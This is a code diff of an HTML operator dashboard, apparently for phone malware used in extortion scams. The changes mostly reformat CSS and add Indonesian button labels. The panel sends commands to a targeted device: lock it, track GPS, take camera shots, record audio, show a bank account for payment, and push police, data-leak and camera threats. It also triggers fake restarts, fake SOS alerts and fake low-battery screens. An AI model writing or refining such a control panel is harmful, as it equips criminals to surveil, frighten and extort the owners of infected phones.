@@ -27,49 +27,15 @@
             --radius-xs: 12px;
         }
         *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            background:var(--bg-deep);
-            background-image:
-                radial-gradient(ellipse at 50% 0%, rgba(0,140,255,.05) 0%, transparent 55%),
-                radial-gradient(ellipse at 85% 15%, rgba(0,200,255,.03) 0%, transparent 45%),
-                radial-gradient(ellipse at 15% 85%, rgba(0,100,255,.03) 0%, transparent 45%);
-            color:var(--text-main);
-            font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;
-            padding:0 0 80px 0;
-            min-height:100vh;
-            -webkit-font-smoothing:antialiased;
-        }
-        .header{
-            display:flex;align-items:center;justify-content:space-between;
-            padding:16px 14px 8px;
-        }
+        body{background:var(--bg-deep);background-image:radial-gradient(ellipse at 50% 0%,rgba(0,140,255,.05) 0%,transparent 55%),radial-gradient(ellipse at 85% 15%,rgba(0,200,255,.03) 0%,transparent 45%),radial-gradient(ellipse at 15% 85%,rgba(0,100,255,.03) 0%,transparent 45%);color:var(--text-main);font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;padding:0 0 80px 0;min-height:100vh;-webkit-font-smoothing:antialiased}
+        .header{display:flex;align-items:center;justify-content:space-between;padding:16px 14px 8px}
         .header .brand{display:flex;align-items:center;gap:10px}
-        .header .brand .logo{
-            width:38px;height:38px;border-radius:var(--radius-xs);
-            background:linear-gradient(135deg,var(--accent),var(--accent-cyan));
-            display:flex;align-items:center;justify-content:center;font-size:20px;
-            box-shadow:0 0 16px rgba(0,160,255,.4);
-        }
+        .header .brand .logo{width:38px;height:38px;border-radius:var(--radius-xs);background:linear-gradient(135deg,var(--accent),var(--accent-cyan));display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:0 0 16px rgba(0,160,255,.4)}
         .header .brand .title{font-size:18px;font-weight:700;color:var(--text-main);letter-spacing:-.5px}
         .header .actions{display:flex;gap:8px}
-        .header .actions .icon-btn{
-            width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.04);
-            border:1px solid rgba(255,255,255,.06);display:flex;align-items:center;
-            justify-content:center;font-size:16px;cursor:pointer;color:var(--text-sub);
-        }
-        .hero{
-            margin:8px 12px;padding:20px;border-radius:var(--radius);
-            background:linear-gradient(135deg,rgba(0,140,255,.12),rgba(0,200,255,.06));
-            border:1px solid var(--border-card);backdrop-filter:blur(24px);
-            -webkit-backdrop-filter:blur(24px);box-shadow:var(--glow-blue);
-            display:flex;align-items:center;gap:16px;
-        }
-        .hero .device-icon{
-            width:64px;height:64px;border-radius:var(--radius-sm);
-            background:linear-gradient(135deg,rgba(0,160,255,.2),rgba(0,200,255,.1));
-            display:flex;align-items:center;justify-content:center;font-size:34px;
-            border:1px solid var(--border-glow);flex-shrink:0;
-        }
+        .header .actions .icon-btn{width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.06);display:flex;align-items:center;justify-content:center;font-size:16px;cursor:pointer;color:var(--text-sub)}
+        .hero{margin:8px 12px;padding:20px;border-radius:var(--radius);background:linear-gradient(135deg,rgba(0,140,255,.12),rgba(0,200,255,.06));border:1px solid var(--border-card);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);box-shadow:var(--glow-blue);display:flex;align-items:center;gap:16px}
+        .hero .device-icon{width:64px;height:64px;border-radius:var(--radius-sm);background:linear-gradient(135deg,rgba(0,160,255,.2),rgba(0,200,255,.1));display:flex;align-items:center;justify-content:center;font-size:34px;border:1px solid var(--border-glow);flex-shrink:0}
         .hero .info{flex:1}
         .hero .info .device-name{font-size:15px;font-weight:700;color:var(--text-main)}
         .hero .info .device-id{font-size:11px;color:var(--text-sub);margin-top:2px}
@@ -82,7 +48,7 @@
         .card{background:var(--bg-card);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid var(--border-card);border-radius:var(--radius);padding:16px;margin-bottom:10px;box-shadow:0 4px 20px rgba(0,0,0,.4)}
         .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
         .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
-        button{padding:14px 12px;border:1px solid transparent;border-radius:var(--radius-sm);font-weight:600;font-size:11px;cursor:pointer;transition:all .25s;letter-spacing:.5px;font-family:'Inter',sans-serif;text-align:center}
+        button{padding:14px 8px;border:1px solid transparent;border-radius:var(--radius-sm);font-weight:600;font-size:10px;cursor:pointer;transition:all .25s;letter-spacing:.5px;font-family:'Inter',sans-serif;text-align:center;line-height:1.3}
         button:active{transform:scale(.95)}
         .btn-cyan{background:rgba(0,180,255,.1);color:var(--accent-cyan);border-color:rgba(0,180,255,.2)}.btn-cyan:hover{background:rgba(0,180,255,.18);box-shadow:var(--glow-cyan)}
         .btn-red{background:rgba(255,51,85,.1);color:var(--accent-red);border-color:rgba(255,51,85,.2)}.btn-red:hover{background:rgba(255,51,85,.18);box-shadow:0 0 18px rgba(255,51,85,.2)}
@@ -90,7 +56,7 @@
         .btn-orange{background:rgba(255,149,0,.1);color:var(--accent-orange);border-color:rgba(255,149,0,.2)}
         .btn-purple{background:rgba(170,68,255,.1);color:var(--accent-purple);border-color:rgba(170,68,255,.2)}
         .btn-gray{background:rgba(255,255,255,.03);color:var(--text-sub);border-color:rgba(255,255,255,.05)}
-        .btn-full{width:100%}
+        .btn-full{width:100%;font-size:12px}
         input{width:100%;padding:13px 16px;background:rgba(8,12,22,.7);color:var(--text-main);border:1px solid var(--border-card);border-radius:var(--radius-xs);font-size:12px;font-family:'Inter',sans-serif;outline:none;transition:all .3s;margin-top:6px}
         input:focus{border-color:var(--border-glow);box-shadow:var(--glow-cyan)}
         input::placeholder{color:var(--text-dim)}
@@ -130,18 +96,22 @@
 
 <div class="section"><div class="section-title">Quick Controls</div>
     <div class="grid-2">
-        <button class="btn-red btn-full" onclick="send('lock')">🔒 Lock</button>
+        <button class="btn-red btn-full" onclick="send('lock')">🔒 Lock Device</button>
         <button class="btn-green btn-full" onclick="send('unlock')">🔓 Release</button>
     </div>
 </div>
 
 <div class="section"><div class="section-title">All Controls — <span id="activeLabel">none</span></div>
     <div class="grid-3">
-        <button class="btn-red" onclick="send('siren')">🔊</button><button class="btn-cyan" onclick="send('vibrate')">📳</button>
-        <button class="btn-orange" onclick="send('flash_on')">💡</button><button class="btn-gray" onclick="send('flash_off')">🌑</button>
-        <button class="btn-purple" onclick="send('wallpaper')">🖼</button><button class="btn-purple" onclick="send('mp3')">🎵</button>
-        <button class="btn-cyan" onclick="send('gps')">📍</button><button class="btn-cyan" onclick="send('camera')">📸</button>
-        <button class="btn-red" onclick="send('record')">🎤</button>
+        <button class="btn-red" onclick="send('siren')">🔊<br>Alarm</button>
+        <button class="btn-cyan" onclick="send('vibrate')">📳<br>Getar</button>
+        <button class="btn-orange" onclick="send('flash_on')">💡<br>Strobe</button>
+        <button class="btn-gray" onclick="send('flash_off')">🌑<br>Mati</button>
+        <button class="btn-purple" onclick="send('wallpaper')">🖼<br>Wall</button>
+        <button class="btn-purple" onclick="send('mp3')">🎵<br>MP3</button>
+        <button class="btn-cyan" onclick="send('gps')">📍<br>GPS</button>
+        <button class="btn-cyan" onclick="send('camera')">📸<br>Kamera</button>
+        <button class="btn-red" onclick="send('record')">🎤<br>Rekam</button>
     </div>
 </div>
 
@@ -151,7 +121,7 @@
     <button class="btn-orange btn-full" onclick="sendRekening()">💳 Tampilkan Rekening</button>
     <input type="text" id="callCenterInput" placeholder="Nomor Call Center...">
     <button class="btn-cyan btn-full" onclick="sendCallCenter()">📞 Call Center</button>
-    <button class="btn-red btn-full" onclick="sendMsg()">📩 Send Message</button>
+    <button class="btn-red btn-full" onclick="sendMsg()">📩 Kirim Pesan</button>
     <button class="btn-red btn-full" onclick="send('police_threat')">👮 Ancaman Polisi</button>
     <button class="btn-red btn-full" onclick="send('leak_threat')">📤 Data Leak Threat</button>
     <button class="btn-orange btn-full" onclick="send('camera_threat')">🎥 Camera Threat</button>
@@ -166,9 +136,12 @@
 
 <div class="section"><div class="section-title">Tools</div>
     <div class="grid-2">
-        <button class="btn-orange" onclick="send('ghost')">👻 Ghost</button><button class="btn-red" onclick="send('popup')">💬 Popup</button>
-        <button class="btn-gray" onclick="send('battery_low')">🔋 Bat 1%</button><button class="btn-gray" onclick="send('screen_off')">📱 Off</button>
-        <button class="btn-gray" onclick="send('fake_restart')">🔄 Boot</button><button class="btn-gray" onclick="send('sos')">🆘 SOS</button>
+        <button class="btn-orange" onclick="send('ghost')">👻 Ghost Sound</button>
+        <button class="btn-red" onclick="send('popup')">💬 Popup Error</button>
+        <button class="btn-gray" onclick="send('battery_low')">🔋 Baterai 1%</button>
+        <button class="btn-gray" onclick="send('screen_off')">📱 Layar Mati</button>
+        <button class="btn-gray" onclick="send('fake_restart')">🔄 Restart Palsu</button>
+        <button class="btn-gray" onclick="send('sos')">🆘 SOS Palsu</button>
     </div>
 </div>
 
@@ -212,4 +185,4 @@ function sendCallCenter(){var t=document.getElementById('callCenterInput').value
 function sendWarning(){if(!s||!ct)return;s.emit('command',{targetId:ct,cmd:'warning',text:'300'})}
 </script>
 </body>
-            </html>
+</html>
